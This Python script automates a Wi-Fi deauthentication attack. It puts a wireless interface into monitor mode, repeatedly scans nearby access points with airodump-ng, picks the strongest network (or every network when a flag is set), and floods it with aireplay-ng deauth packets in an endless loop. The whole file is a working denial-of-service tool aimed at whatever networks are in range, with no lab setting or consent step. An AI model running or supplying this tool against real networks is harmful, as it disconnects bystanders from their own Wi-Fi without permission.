import subprocess
import csv
import datetime
import os
import time
import re
#import pprint
import _thread

current_channel = -1

def hop_channel(interface, channel):
	global current_channel
	process = subprocess.Popen(["sudo", "iwconfig", interface, "channel", str(channel)], stdout=subprocess.PIPE, stderr = subprocess.PIPE)
	stdout, stderr = process.communicate()
	current_channel = channel
	print("Hopped to channel", channel)


def deauth(interface, num_pkts_to_send, ap_mac, ap_channel, ap_essid):
	global current_channel
	try:
		print("Deauthing", ap_essid, "(", ap_mac, ") on channel", ap_channel, "num of packets: ", num_pkts_to_send, "...")
		if(current_channel != ap_channel):
			hop_channel(interface, ap_channel)
		date = datetime.datetime.now()
		process = subprocess.Popen(['sudo', 'aireplay-ng', "-0", str(num_pkts_to_send), "-a", ap_mac, interface], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
		stdout, stderr = process.communicate()
		date2 = datetime.datetime.now()
		print("Delta time =",date2-date)

	except KeyboardInterrupt:
		print("Stopping")
		exit(0)

def read_csv(directory, file_name):
	bssids = []
	channels = []
	essids = []
	powers = []
	with open(os.path.join(directory, file_name)) as csv_file:
		reader = csv.reader(csv_file)
		next(reader) #Skip first empty line
		next(reader) #Skip header
		for row in reader:
			if(row):
				#Check power not -1
				if(int(row[8].strip()) == -1):
					print("Power is -1, continuing")
					continue
				#Reached AP table
				bssids.append(row[0])                  #BSSID index
				channels.append(int(row[3].strip()))   #Channel index
				essids.append(row[13])                 #ESSID index
				powers.append(row[8])
			else:
				#Reached clients table, exit (only ap is interesting)
				break
	if(bssids and channels and essids and powers):
		return bssids, channels, essids, powers
	else:
		print("Invalid return type")
		print("bssids")
		print(bssids)
		print("channels")
		print(channels)
		print("essids")
		print(essids)
		print("powers")
		print(powers)
		return None

def deauth_from_csv(file_dir, file_name, interface, num_pkts_to_send):
	#Does minimal channel hopping for faster performance
	ret = read_csv(file_dir, file_name)
	if(not ret):
		return
	bssids, channels, essids, powers = ret
	#Check length
	if(len(bssids) != len(channels) != len(essids) != len(powers)):
		print("Length of bssids/channels/essids missmatch")
		exit(1)

	#Create list
	my_list = []
	for (bssid, channel, essid, power) in zip(bssids, channels, essids, powers):
		if(int(channel) <= 0 or int(power) >= -1):
			continue
		my_list.append([bssid, channel, essid, power])

	deauth_all = False

	if(deauth_all):
		#Sort by channels (index = 1)
		my_list.sort(key=lambda x: x[1], reverse=True)

		#Deauth
		for lst in my_list:
			deauth(interface, num_pkts_to_send, lst[0], lst[1], lst[2])
	else:
		my_list.sort(key=lambda x: x[3])
		lst = my_list[0]
		deauth(interface, num_pkts_to_send, lst[0], lst[1], lst[2])


def airodump(interface, dump_dir, dump_prefix):
	FNULL = open("/dev/null", "w")
	subprocess.Popen(["sudo", "airodump-ng", interface, "-w", dump_dir+"/"+dump_prefix, "--output-format", "csv"], stdout=FNULL, stderr=FNULL)
	print("airodump-ng process started")
#	subprocess.call('sudo airodump-ng '+interface +" -w "+dump_dir+"/"+dump_prefix+" --output-format csv", shell=False, stdout=FNULL, stderr=FNULL)

def killall_airodump():
	print("Killing airodump-ng processes")
	FNULL = open("/dev/null", "w")
	p = subprocess.Popen(["sudo", "killall", "airodump-ng"], stdout=FNULL, stderr=FNULL)
	p.communicate()

def rm_csv(dump_dir):
	print("Removing dump files")
#	FNULL = open("/dev/null", "w")
#	p = subprocess.Popen(["sudo", "rm", dump_dir+"/*.csv", "-f"], stdout=FNULL, stderr=FNULL)
#	p.communicate()
	subprocess.call('rm -rf '+dump_dir+"/*.csv", shell=True)

def get_latest_csv(directory, dump_prefix):
	onlyfiles = [f for f in os.listdir(directory) if os.path.isfile(os.path.join(directory, f))]
	pattern = "dump-(\d*)\.csv"   #Only get files that are dump files
	dump_files = {}
	for f in onlyfiles:
		x = re.search(pattern, f)
		if(x):
			creation_time = time.ctime(os.path.getctime(os.path.join(directory, f)))
			dump_files[f] = creation_time

	dump_files2 = {}
	for k in sorted(dump_files, key=dump_files.get, reverse=True):
		dump_files2[k] = dump_files[k]

	#pprint.pprint(dump_files2)

	if(len(dump_files2) > 0):
		return list(dump_files2.keys())[0]
	else:
		return None

def airmon_start(interface):
	FNULL = open("/dev/null", "w")
	subprocess.Popen(["sudo", "wpa_cli", "-i", interface, "terminate"], stdout=FNULL, stderr=FNULL) 
	p = subprocess.Popen(["sudo", "airmon-ng", "start", interface], stderr=FNULL, stdout=FNULL)
	p.communicate()
	print("Monitor mode enabled")	

#Main program

if(os.geteuid() != 0):
	print("Run as root")
	exit(1)

#Variables
dump_prefix = "dump"
dump_dir = "/home/pi/dump"
deauth_num_pkts = 100
iface = "wlan1"
deauth_max_seconds = 30 #When time is up, reload everything, so new networks / stronger networks are targeted

airmon_start(iface) #Start monitor mode. Not good idea to run this every time the script runs. Usually this is in my startup script when reboot is finished.
rm_csv(dump_dir) #Remove old CSVs

while True:
	try:
		airodump(iface, dump_dir,dump_prefix) #Save new APs to CSV
		time.sleep(10) #Let it write a little to csv before reading immidietly
		killall_airodump() #Kill airodump
		print("Getting latest dump file")
		latest_dump_csv_file_name = get_latest_csv(dump_dir,dump_prefix) #We want to get latest 'scan' of APs. Old scans will stay on disk, because its interesting
		print("Latest dump:", latest_dump_csv_file_name)

		if(not latest_dump_csv_file_name):
			print("Latest dump file invalid")
			exit(1)

		date_start = datetime.datetime.now()
		#Deauth
		deauth_from_csv(dump_dir, latest_dump_csv_file_name, iface, deauth_num_pkts)			
		print("While loop")

	except KeyboardInterrupt:
		print("Stopping")
		exit(1)

print("Script finished")

